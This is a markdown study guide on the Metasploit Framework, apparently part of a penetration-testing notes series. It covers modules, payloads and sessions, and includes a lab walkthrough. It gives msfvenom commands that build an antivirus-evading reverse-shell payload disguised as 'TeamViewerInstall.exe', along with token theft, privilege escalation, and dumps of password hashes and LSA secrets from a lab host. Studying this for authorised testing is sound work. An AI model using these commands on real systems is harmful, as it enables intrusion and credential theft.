
# 🕷️ Metasploit Framework  
*Within this eldritch grimoire lies a vast arsenal of arcane tools for network divination, weaving attacks, and unraveling the deepest secrets of target systems. Harness its dark power to evade the watchful eyes, ascend to forbidden privileges, and command dominion after the breach.*

> *“To command the shadows is to master the unseen forces that bind the network.”*

<details>
<summary><h2>⚠️ Warnings to the Seeker of Shrouded Truth ⚠️</h2></summary>

**Do not get tunnel vision.**
> *Beware the madness that comes from gazing too long into a single artifact. The Framework is but one relic among many—do not let it become your crutch or your altar. Use it with intent, not dependence.*

**Please read all the technical documentation you can find for any of our tools.**
> *Before invoking forgotten runes, one must study the glyphs etched in the margins of the old tomes. Knowledge is the warding circle that keeps the daemon in the cage. Read. Absorb. Comprehend.*

**Many tools can prove to be unpredictable.**
> *Every incantation comes with a price. Some conjurations may awaken watchers, leaving ghostly footprints across the target's domain. Others may tear open rifts in your own sanctum. Always proceed with wards in place and a retreat mapped.*

</details>

---

<details>
<summary><h2>📥 Installation</h2></summary>

The official Metasploit Repository can be found [here](https://github.com/rapid7/metasploit-framework/).  

**Install**

```bash
sudo apt update && sudo apt install metasploit-framework
```

**Verify installation**

```bash
msfconsole -q
```

</details>

---

<details>
<summary><h2>📜 Introduction</h2></summary>

**Modules**

```bash
ls /usr/share/metasploit-framework/modules
```  

**Plugins**

```bash
ls /usr/share/metasploit-framework/plugins/
```  

**Scripts**

```bash
ls /usr/share/metasploit-framework/scripts/
```  

**Tools**

```bash
ls /usr/share/metasploit-framework/tools/
```  

</details>

---

<details>
<summary><h2>🧩 MSF Components</h2></summary>

<details>
<summary><h3>Modules</h3></summary>

Metasploit modules are pre-built scripts designed for specific tasks, each with corresponding functions that have been thoroughly developed and tested in real-world scenarios.

Within the msfconsole, users can choose from a comprehensive collection of available Metasploit modules. These modules are organized into folders, displayed in the following structure:

**Syntax**  

```bash
<No.> <type>/<os>/<service>/<name>
```  

**Example**  

```bash
794   exploit/windows/ftp/scriptftp_list
```  

<details>
<summary><h4>Explanation</h4></summary>

**Index No.**

The No. tag will be displayed to select the exploit we want afterward during our searches.

**Type**

The **Type** tag categorizes Metasploit modules at the highest level. By examining this field, we can determine the module’s intended function. Some types—such as exploit modules—are not directly executable but exist for structural and organizational purposes.

The table below consolidates all possible module types, their descriptions, and indicates whether they can be directly interacted with (e.g., via **use <no.>**).

| Type      | Description                                                                                   | Interactable |
|-----------|-----------------------------------------------------------------------------------------------|--------------|
| Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.| ✅           |
| Encoders  | Ensure that payloads are intact to their destination.                                         | ❌           |
| Exploits  | Exploit a vulnerability that allows for payload delivery.                                     | ✅           |
| NOPs      | (No Operation code) Keep payload sizes consistent across exploit attempts.                    | ❌           |
| Payloads  | Code that runs remotely and calls back to the attacker to establish a connection or shell.    | ❌           |
| Plugins   | Additional scripts integrated within assessments via `msfconsole`.                            | ❌           |
| Post      | Modules for information gathering, pivoting deeper into the network, and more.                | ✅           |

**OS**  

The OS tag indicates the target operating system and architecture for which the module was designed. Since different operating systems require distinct code execution methods, this tag ensures compatibility with the intended environment.

**Service**  

The Service tag identifies the vulnerable service running on the target machine. However, for certain modules (e.g., auxiliary or post), this tag may represent a broader action—such as _gather_—which refers to activities like credential collection.

**Name**

The Name tag describes the module's core function—the specific action it performs for its intended purpose.

</details>

<details>
<summary><h4>Search</h4></summary>

Search function

```bash
msf6 > help search
```  

Searching for a module

```bash
msf6 > search eternalblue
```  

Specific search

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```  

Specific payload search

```bash
msf6 > grep meterpreter show payloads
```

Even more specific search

```bash
msf6 > grep meterpreter grep reverse_tcp show payloads
```

</details>

<details>
<summary><h4>Select</h4></summary>

Select Module

```bash
msf6 > use 0
```  

Show options

```bash
msf6 > options
```  

</details>

<details>
<summary><h4>Set</h4></summary>

**Target Specification**

```bash
msf6 > set RHOSTS <TARGET IP>
```  

**Permanent Target Specification**

```bash
msf6 > setg RHOSTS <TARGET IP>
```  

**Target Port Specification**

```bash
msf6 > set RPORT <TARGET PORT>
```  

**Attacker IP specification**

```bash
msf6 > set LHOST <ATTACKER IP>
```  

**Permanent Attacker IP specification**

```bash
msf6 > setg LHOST <ATTACKER IP>
```  

**Attacker Port Specification**

```bash
msf6 > set LPORT <ATTACKER PORT>
```  

</details>

<details>
<summary><h4>Information</h4></summary>

Show info

```bash
msf6 > info
```  

</details>

<details>
<summary><h4>Exploit Execution</h4></summary>

Execute

```bash
msf6 > run
```

</details>

</details>


<details>
<summary><h3>Common Payloads</h3></summary>

The table below contains the most common payloads used for Windows machines and their respective descriptions.


| Payload                             | Description                                                                 |
|-------------------------------------|-----------------------------------------------------------------------------|
| generic/custom                      | Generic listener, multi-use                                                |
| generic/shell_bind_tcp              | Generic listener, multi-use, normal shell, TCP connection binding          |
| generic/shell_reverse_tcp           | Generic listener, multi-use, normal shell, reverse TCP connection          |
| windows/x64/exec                    | Executes an arbitrary command (Windows x64)                                |
| windows/x64/loadlibrary             | Loads an arbitrary x64 library path                                        |
| windows/x64/messagebox              | Spawns a dialog via MessageBox with customizable title, text & icon        |
| windows/x64/shell_reverse_tcp       | Normal shell, single payload, reverse TCP connection                       |
| windows/x64/shell/reverse_tcp       | Normal shell, stager + stage, reverse TCP connection                       |
| windows/x64/shell/bind_ipv6_tcp     | Normal shell, stager + stage, IPv6 Bind TCP stager                         |
| windows/x64/meterpreter/$           | Meterpreter payload + varieties above                                      |
| windows/x64/powershell/$            | Interactive PowerShell sessions + varieties above                          |
| windows/x64/vncinject/$             | VNC Server (Reflective Injection) + varieties above  

</details>

<details>
<summary><h3>Targets</h3></summary>

The **Target** field specifies particular operating system versions that the exploit module has been adapted to work with. These unique OS identifiers allow the module to customize its execution for specific system versions.

**Show Targets**  

```bash
msf6 > show targets
```

Regular output:
```bash
# Exploit targets:
# 
#    Id  Name
#    --  ----
#    0   Automatic
```

Exploit-specific output:
```bash
# Exploit targets:
# 
#    Id  Name
#    --  ----
#    0   Automatic
#    1   IE 7 on Windows XP SP3
#    2   IE 8 on Windows XP SP3
#    3   IE 7 on Windows Vista
#    4   IE 8 on Windows Vista
#    5   IE 8 on Windows 7
#    6   IE 9 on Windows 7
```

**Select Targets**  

```bash
msf6 > set target 6
```

</details>

<details>
<summary><h3>Payloads</h3></summary>

In Metasploit, a payload is a module that enables successful exploitation, typically by establishing a shell session for the attacker. 

**Show all payloads**

```bash
msf6 > show payloads
```

The framework provides three distinct payload types:


<details>
<summary><h4>1. Singles</h4></summary>

A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.
</details>

<details>
<summary><h4>2. Stagers</h4></summary>

_Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.  

</details>

<details>
<summary><h4>3. Stages</h4></summary>

_Stages_ are payload components that are downloaded by stager's modules.  

Payload stages automatically use middle stagers:

* A single recv() fails with large payloads
* The Stager receives the middle stager
* The middle Stager then performs a full download
* Also better for RWX

</details>

</details>

<details>
<summary><h3>Staged Payloads</h3></summary>

A staged payload modularizes the exploitation process by separating functionality into discrete components. Each stage performs specific tasks while chaining together to execute the complete attack.

Like all payloads, its objectives are twofold:

1. Establish shell access on the target system

2. Maintain minimal footprint to evade AV/IPS detection

**Connection Methodology:**

* Stage 0 (Reverse Connection):

    * The victim host initiates contact back to the attacker

    * Lower detection risk as the connection originates from within the target's security trust zone

    * Establishes initial communication channel

* Stage 1 (Shell Access):

    * After stable connection is established

    * Attacker delivers the larger, more functional payload component

    * Typically provides full shell access and control

<details>
<summary><h4>Meterpreter Payload</h4></summary>

The Meterpreter payload is a specific type of multi-faceted payload that:

- Uses **DLL injection** to establish a stable and covert connection with the victim host.
- Is designed to be **difficult to detect** using simple or conventional system checks.
- Maintains **persistence** across system reboots or changes (depending on configuration).
- Resides **entirely in memory**, leaving **no traces on the hard drive**.
- Evades many **traditional forensic detection techniques**.
- Allows **dynamic loading and unloading of scripts and plugins** during runtime.

</details>

</details>

<details>
<summary><h3>Encoders</h3></summary>

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These architectures include:

- x64
- x86
- sparc
- ppc
- mips

Encoders were packed separately from the msfconsole script and were called **msfpayload** and **msfencode**. These two tools are located in _/usr/share/framework2/_.

**Generating Payload - Without Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl
```  

**Generating Payload - With Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
```  

**Generate a payload with the exe format, called TeamViewerInstall.exe**  

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```  

**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**  

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```  

As anticipated, most commercial antivirus solutions can detect these payloads during real-world engagements. Therefore, additional evasion techniques become necessary to bypass modern endpoint protection systems.

</details>

<details>
<summary><h3>Databases</h3></summary>

The Metasploit Framework utilizes databases within msfconsole to systematically store and manage penetration testing results. The system features native PostgreSQL integration, providing:

**Key Benefits:**

* Instant access to scan results and historical data

* Efficient data management through direct database interaction

* Seamless import/export functionality for integration with external tools

<details>
<summary><h4>Setting up the Database</h4></summary>

**PostgreSQL Status**

```bash
sudo service postgresql status
```  

**Start PostgreSQL**
```bash
sudo systemctl start postgresql
```  

**Initiate a Database**
```bash
sudo apt-get upgrade metasploit-framework
sudo msfdb init
```  

**MSF - Database Status**

```bash
sudo msfdb status
``` 

**MSF - Connect to the Initiated Database**  

```bash
sudo msfdb run
``` 

If your database is already configured but you're unable to modify the MSF user password, use the following command sequence:

**MSF - Reinitiate the Database**

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
``` 

**MSF - msf6 Database Status**

```bash
msf6 > db_status
``` 

**MSF - Database Options**  

```bash
msf6 > help database
``` 

**MSF - Using Nmap Inside MSFconsole**  

```bash
msf6 > db_nmap -sV -sS <TARGET IP>
``` 

**MSF - Review scan results**  

```bash
msf6 > hosts -h
msf6 > services -h
msf6 > creds -h
msf6 > loot -h
``` 

**MSF - Database Backup**  

```bash
msf6 > db_export -f xml backup.xml
``` 

</details>

</details>

<details>
<summary><h3>Plugins</h3></summary>

Metasploit plugins interact directly with the framework’s API, enabling deep integration and control. They serve three primary purposes:

* Automation – Streamline repetitive tasks

* Extensibility – Add custom commands to msfconsole

* Enhancement – Expand the framework’s built-in capabilities

**Listing plugins**  

```bash
ls /usr/share/metasploit-framework/plugins
``` 

**MSF - Load Plugin**  

```bash
msf6 > load nessus
msf6 > nessus_help
``` 

**Downloading plugins**  

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
``` 

**MSF - Copying Plugin to MSF**  

```bash
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
``` 

**MSF - Load the new plugin**  

```bash
msf6 > load pentest
msf6 > help
``` 

</details>

</details>

---

<details>
<summary><h2>🤝 MFS Sessions</h2></summary>

<details>
<summary><h3>Sessions</h3></summary>

**Multi-Session Management in MSFconsole**

MSFconsole supports concurrent management of multiple modules and sessions. Key capabilities include:

1. Session Switching – Seamlessly transition between active sessions

2. Module Linking – Attach new modules to backgrounded sessions

3. Job Conversion – Convert sessions into persistent background jobs

**Important Notes:**

* Backgrounded sessions maintain active connections to target hosts

* Sessions may terminate unexpectedly due to:

    * Payload execution failures

    * Communication channel disruptions

**Backgrounding Sessions in MSFconsole**  

Active sessions can be backgrounded when they maintain communication with the target host. This allows operators to:

* Preserve established connections

* Switch between multiple engagements

* Deploy additional modules without session interruption

**Backgrounding Methods:**

1. Keyboard Shortcut: CTRL+Z (Universal)

2. Meterpreter Command: meterpreter > bg

**Process Flow:**

1. Initiate background request

2. Confirm action via prompt

3. Return to msf6

4. Immediately deploy new modules

**Listing Active Sessions**

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions
```  

**Interacting with a Session**

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
``` 

</details>

<details>
<summary><h3>Jobs</h3></summary>

When an active exploit occupies a port needed for another module, improper termination (e.g., CTRL+C) leaves the port bound. Instead, follow this procedure:

**1. Check Active Jobs**

```bash
msf6 > jobs -l
``` 

**2. Terminate Conflicts**

```bash
msf6 > jobs -k <ID>
``` 

**Jobs Command Help Menu**  

```bash
msf6 > jobs -h
``` 

**Running an Exploit as a Background Job**  

```bash
msf6 > exploit -j
``` 

</details>

<details>
<summary><h3>Meterpreter</h3></summary>

The Meterpreter payload is an advanced, modular attack platform that employs sophisticated techniques to maintain stealth and persistence:

<details>
<summary><h4>Objectives</h4></summary>

* Provide a stable, extensible platform for internal host enumeration

* Facilitate rapid privilege escalation path discovery

* Enable advanced defensive evasion techniques

</details>

<details>
<summary><h4>Capabilites</h4></summary>

* Utilizes reflective DLL injection for stable, low-detectability implants

* Supports memory-only operation (no disk artifacts)

* Features configurable persistence mechanisms

</details>

<details>
<summary><h4>Operational Advantages</h4></summary>

1. Stealth Characteristics

    * No traditional process spawning

    * Avoids disk writes (in-memory execution only)

    * Encrypted communications channel

2. Persistence Options

    * Survives system reboots when properly configured

    * Maintains sessions through network changes

    * Supports migration between processes

3. Extended Functionality

    * Modular architecture for on-demand capability expansion

    * Built-in privilege escalation techniques

    * Comprehensive post-exploitation toolkit
</details>

<details>
<summary><h4>Using Meterpreter</h4></summary>

Displays a list of available Meterpreter commands and their descriptions.

```bash
meterpreter > help
``` 

Shows the current user (UID) that the Meterpreter session is running under.

```bash
meterpreter > getuid
``` 

Lists all running processes on the target system, including PIDs and owners.

```bash
meterpreter > ps
``` 

Steals the security token from a specified process (PID 1836) to impersonate its privileges.

```bash
meterpreter > steal_token 1836
``` 

Dumps the password hashes of all local user accounts (stored in the SAM database).

```bash
meterpreter > hashdump
``` 

Extracts and displays password hashes from the Security Account Manager (SAM) via the LSASS process.

```bash
meterpreter > load kiwi
meterpreter > lsa_dump_sam
``` 

Retrieves encrypted secrets (like cached credentials and auto-login passwords) from the LSASS memory.

```bash
meterpreter > lsa_dump_secrets
``` 

</details>

<details>
<summary><h4>Example Compromise Walkthrough</h4></summary>



**MSF - Meterpreter Migration**

```bash
meterpreter > getuid
# [-] 1055: Operation failed: Access is denied.

meterpreter > ps
# Process List
# ============
# 
#  PID   PPID  Name               Arch  Session  User                          Path
#  ---   ----  ----               ----  -------  ----                          ----
#  0     0     [System Process]                                                
#  4     0     System                                                  #         
#  216   1080  cidaemon.exe                                                    
#  272   4     smss.exe                                                     #    
#  292   1080  cidaemon.exe                                                    
# <...SNIP...>

# 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe


meterpreter > steal_token 1836
# Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid

# Server username: NT AUTHORITY\NETWORK SERVICE

``` 

**MSF - Meterpreter Migration**
```bash
meterpreter > bg

# Background session 1? [y/N]  y

msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

# Matching Modules
# ================
# 
#    #  Name                                      Disclosure Date  Rank    Check  Description
#    -  ----                                       ---------------  ----    -----  -----------
#    0  post/multi/recon/ local_exploit_suggester                   normal   No     Multi Recon Local Exploit Suggester

msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

# Module options (post/multi/recon/local_exploit_suggester):
# 
#    Name             Current Setting  Required  Description
#    ----             ---------------  --------  -----------
#    SESSION                           yes       The session to run this module on
#    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

# SESSION => 1

msf6 post(multi/recon/local_exploit_suggester) > run

# [*] 10.10.10.15 - Collecting local exploits for x86/windows...
# [*] 10.10.10.15 - 34 exploit checks are being tried...
# [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
# [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
# [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
# [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
# [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
# [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
# [*] Post module execution completed 

msf6 post(multi/recon/local_exploit_suggester) > 
```

**MSF - Privilege Escalation**

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

# [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

# Module options (exploit/windows/local/ms15_051_client_copy_image):

#    Name     Current Setting  Required  Description
#    ----     ---------------  --------  -----------
#    SESSION                   yes       The session to run this module on.


# Payload options (windows/meterpreter/reverse_tcp):

#    Name      Current Setting  Required  Description
#    ----      ---------------  --------  -----------
#    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
#    LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
#    LPORT     4444             yes       The listen port


# Exploit target:

#    Id  Name
#    --  ----
#    0   Windows x86

msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1

# SESSION => 1

msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

# LHOST => tun0

msf6 exploit(windows/local/ms15_051_client_copy_image) > run

# [*] Started reverse TCP handler on 10.10.14.26:4444 
# [*] Launching notepad to host the exploit...
# [+] Process 844 launched.
# [*] Reflectively injecting the exploit DLL into 844...
# [*] Injecting exploit into 844...
# [*] Exploit injected. Injecting payload into 844...
# [*] Payload injected. Executing exploit...
# [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
# [*] Sending stage (175174 bytes) to 10.10.10.15
# [*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000

meterpreter > getuid

# Server username: NT AUTHORITY\SYSTEM

``` 

**MSF - Dumping Hashes**

```bash
meterpreter > hashdump

# Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
# ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
# IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
# Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
# SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::

meterpreter > lsa_dump_sam

# [+] Running as SYSTEM
# [*] Dumping SAM
# Domain : GRANNY
# SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
# Local SID : S-1-5-21-1709780765-3897210020-3926566182

# SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

# RID  : 000001f4 (500)
# User : Administrator
#   Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
#   Hash NTLM: d6908f022af0373e9e21b8a241c86dca

# RID  : 000001f5 (501)
# User : Guest

# RID  : 000003e9 (1001)
# User : SUPPORT_388945a0
#   Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

# RID  : 000003eb (1003)
# User : IUSR_GRANPA
#   Hash LM  : a274b4532c9ca5cdf684351fab962e86
#   Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

# ...
```

**MSF - Meterpreter LSA Secrets Dump**

```bash
meterpreter > lsa_dump_secrets

# [+] Running as SYSTEM
# [*] Dumping LSA secrets
# Domain : GRANNY
# SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

# Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
# Domain name : HTB

# Policy subsystem is : 1.7
# LSA Key : ada60ee248094ce782807afae1711b2c

# Secret  : aspnet_WP_PASSWORD
# cur/text: Q5C'181g16D'=F

# Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
# cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

# Secret  : DPAPI_SYSTEM
# cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
#     full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
#     m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

# Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
# cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

# Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
# cur/hex : 00 f2 d1 31 e2 11 d3 01 

# Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

```

</details>

</details>

</details>

---

<details>
<summary><h2>➕ Additional Features</h2></summary>

<details>
<summary><h3>Writing & Importing Modules</h3></summary>

**Required Formatting**

* **Character Set**

    * ✅ Alphanumeric characters only (a-z, 0-9)

    * ✅ Underscores (_) for word separation

* **Case Standard**

    * Exclusive use of snake_case (all lowercase)

    * Example: exploit/windows/http/example_module.rb

* **Prohibited Elements**

    * ❌ Hyphens (-) or spaces

    * ❌ Special characters (@, #, &, etc.)

    * ❌ Uppercase letters

* **Common Error Scenarios**

    1. Hyphen Misuse

        * ❌ Invalid: my-module.rb

        * ✅ Valid: my_module.rb

    2. Case Sensitivity

        * ❌  Invalid: MyModule.rb

        * ✅ Valid: my_module.rb  

<details>
<summary><h4>Full Upgrade</h4></summary>

To incorporate community-developed modules into your Metasploit installation:

Execute:

```bash
msfupdate
``` 

This fetches all newly integrated:

* Exploit modules

* Auxiliary components

* Framework enhancements

</details>

<details>
<summary><h4>Manual</h4></summary>

1. Source Selection

    * Prioritize ExploitDB for verified modules

    * Filter using the "Metasploit Framework (MSF)" tag to ensure compatibility

2. Installation

Download module:

```bash
wget <EXPLOIT URL> -O /usr/share/metasploit-framework/modules/exploits/<CATEGORY>/<EXPLOIT>
``` 

3. Verification

Search within msfconsole:

```bash
msf6 > search type:exploit <module_name>
``` 

</details>

</details>

<details>
<summary><h3>Introduction to MSFVenom</h3></summary>

Text

</details>

<details>
<summary><h3>Firewall and IDS/IPS evasion</h3></summary>

Text

</details>

</details>

---

📘 **Next step:** Continue with [PASSWORD ATTACKS](./07-password-attacks.md)
